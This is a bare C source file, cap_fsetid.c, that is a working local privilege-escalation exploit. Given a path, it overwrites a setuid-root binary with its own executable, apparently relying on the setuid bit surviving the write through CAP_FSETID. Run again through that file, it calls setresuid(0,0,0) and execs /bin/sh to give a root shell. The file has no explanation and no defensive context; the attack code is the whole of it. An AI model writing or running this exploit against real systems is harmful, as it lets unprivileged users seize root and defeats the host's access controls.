/* -*- compile-command: "gcc -Wall -Werror -static cap_fsetid.c -o cap_fsetid" -*- */
#define _GNU_SOURCE
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>

int main(int argc, char **argv)
{
    if (argc == 2)
    {
        /* write our contents to the setuid file. */
        int setuid_file = 0;
        int own_file = 0;
        if ((setuid_file = open(argv[1], O_WRONLY | O_TRUNC)) == -1 || (own_file = open(argv[0], O_RDONLY)) == -1)
        {
            fprintf(stderr, "++ open failed: %m\n");
            return 1;
        }
        errno = 0;
        char here = 0;
        while (read(own_file, &here, 1) > 0 && write(setuid_file, &here, 1) > 0)
            ;
        ;
        if (errno)
        {
            fprintf(stderr, "++ reading/writing: %m\n");
            close(setuid_file);
            close(own_file);
        }
        close(own_file);
        close(setuid_file);
    }
    else
    {
        if (setresuid(0, 0, 0))
        {
            fprintf(stderr, "++ failed switching uids to root: %m\n");
            return 1;
        }
        execve("/bin/sh", (char *[]){"sh", 0}, NULL);
    }
    return 0;
}
